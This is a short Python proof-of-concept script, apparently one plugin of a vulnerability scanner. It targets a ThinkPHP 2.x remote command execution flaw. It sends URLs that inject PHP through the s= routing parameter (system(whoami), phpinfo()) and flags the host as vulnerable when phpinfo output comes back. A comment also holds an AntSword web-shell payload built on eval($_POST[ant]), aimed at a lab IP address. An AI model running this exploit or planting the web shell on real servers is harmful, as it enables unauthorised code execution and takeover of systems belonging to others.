import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'ThinkPHP 2.x 远程命令执行漏洞'


def run(url):
    host = urlparse(url)
    headers = {
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    vulurl = f"{host.scheme}://{host.netloc}/index.php?s=/index/index/name/$%7Bsystem(whoami)%7D"
    vulurl = f"{host.scheme}://{host.netloc}/index.php?s=/index/index/name/$%7Bphpinfo()%7D"
    # 蚁剑连接
    # http://192.168.215.208:8080/index.php/module/action/param1/${@print(eval($_POST[ant]))}
    try:
        response = requests.get(vulurl, headers=headers, timeout=15, verify=False)
        if 'Configure Command' in response.text:
            return ['True',name,vulurl]
        else:
            return ['False',name]
    except Exception as e:
        return ['False',name]

if __name__ == '__main__':
    url = 'http://192.168.215.208:8080/'
    print(run(url))